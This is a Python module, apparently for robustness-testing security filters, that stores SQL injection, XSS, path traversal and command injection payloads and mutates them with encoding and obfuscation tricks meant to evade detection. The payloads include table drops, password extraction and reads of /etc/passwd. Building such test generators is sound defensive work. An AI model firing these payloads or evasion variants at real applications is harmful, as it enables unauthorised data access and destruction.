from typing import List, Dict, Any, Optional
import random
import urllib.parse
import base64
import re


class AttackVariantGenerator:
    """Generates adversarial variants of attack payloads for robustness testing."""

    # Default payloads per attack family
    DEFAULT_PAYLOADS = {
        "sql_injection": [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL,NULL,NULL--",
            "'; DROP TABLE users--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "admin'--",
            "' OR '1'='1' LIMIT 1--",
            "1' ORDER BY 1--",
            "' UNION SELECT username,password FROM users--",
            "'; INSERT INTO users VALUES ('hacker','pass')--",
        ],
        "xss": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<details open ontoggle=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            "<math><maction actiontype='statusline'>xss",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "/var/www/../../etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        ],
        "command_injection": [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "&& cat /etc/passwd",
            "; id",
            "| id",
            "`id`",
            "$(id)",
            "&& id",
        ],
    }

    # Transformation functions
    TRANSFORMATIONS = {
        "url_encode": lambda s: urllib.parse.quote(s, safe=""),
        "double_url_encode": lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=""), safe=""),
        "uppercase": lambda s: s.upper(),
        "lowercase": lambda s: s.lower(),
        "random_case": lambda s: "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s),
        "add_whitespace": lambda s: re.sub(r"(\w)", r"\1 ", s).strip(),
        "add_tabs": lambda s: re.sub(r"(\w)", r"\1\t", s).strip(),
        "add_newlines": lambda s: re.sub(r"(\w)", r"\1\n", s).strip(),
        "sql_comment": lambda s: s + " --" if not s.endswith("--") else s,
        "sql_inline_comment": lambda s: re.sub(r"(\s)", r"/**/", s),
        "base64_encode": lambda s: base64.b64encode(s.encode()).decode(),
        "hex_encode": lambda s: "".join(f"\\x{ord(c):02x}" for c in s),
        "unicode_encode": lambda s: "".join(f"\\u{ord(c):04x}" for c in s),
        "html_entity_encode": lambda s: "".join(f"&#{ord(c)};" for c in s),
        "add_null_byte": lambda s: s + "%00",
        "parameter_pollution": lambda s: s + "&" + s,
        "json_wrap": lambda s: f'{{"input":"{s}"}}',
        "xml_wrap": lambda s: f"<input>{s}</input>",
    }

    def __init__(self, seed: Optional[int] = None):
        if seed is not None:
            random.seed(seed)

    def get_default_payloads(self, family: str) -> List[str]:
        """Get default payloads for an attack family."""
        return self.DEFAULT_PAYLOADS.get(family, [])

    def generate_variants(
        self,
        base_payloads: List[str],
        family: str,
        count: int,
    ) -> List[Dict[str, Any]]:
        """Generate attack variants from base payloads."""
        variants = []
        transformations_list = list(self.TRANSFORMATIONS.keys())

        for base in base_payloads:
            if len(variants) >= count:
                break

            # Add original
            variants.append({
                "payload": base,
                "original": base,
                "transformations": ["original"],
                "family": family,
            })

            # Generate transformed variants
            while len(variants) < count:
                # Pick random transformations (1-3)
                num_transforms = random.randint(1, 3)
                selected = random.sample(transformations_list, num_transforms)

                payload = base
                applied = ["original"]
                for transform_name in selected:
                    try:
                        payload = self.TRANSFORMATIONS[transform_name](payload)
                        applied.append(transform_name)
                    except Exception:
                        pass

                if payload != base:
                    variants.append({
                        "payload": payload,
                        "original": base,
                        "transformations": applied,
                        "family": family,
                    })

        # If still need more, generate combinations
        while len(variants) < count:
            base = random.choice(base_payloads)
            num_transforms = random.randint(2, 4)
            selected = random.sample(transformations_list, num_transforms)

            payload = base
            applied = ["original"]
            for transform_name in selected:
                try:
                    payload = self.TRANSFORMATIONS[transform_name](payload)
                    applied.append(transform_name)
                except Exception:
                    pass

            if payload != base:
                variants.append({
                    "payload": payload,
                    "original": base,
                    "transformations": applied,
                    "family": family,
                })

        return variants[:count]

    def generate_targeted_variants(
        self,
        payload: str,
        transformations: List[str],
    ) -> List[Dict[str, Any]]:
        """Generate variants with specific transformations."""
        variants = []
        for transform_name in transformations:
            if transform_name in self.TRANSFORMATIONS:
                try:
                    transformed = self.TRANSFORMATIONS[transform_name](payload)
                    variants.append({
                        "payload": transformed,
                        "original": payload,
                        "transformations": ["original", transform_name],
                    })
                except Exception:
                    pass
        return variants


# Singleton
_generator: Optional[AttackVariantGenerator] = None


def get_attack_generator(seed: Optional[int] = None) -> AttackVariantGenerator:
    global _generator
    if _generator is None:
        _generator = AttackVariantGenerator(seed)
    return _generator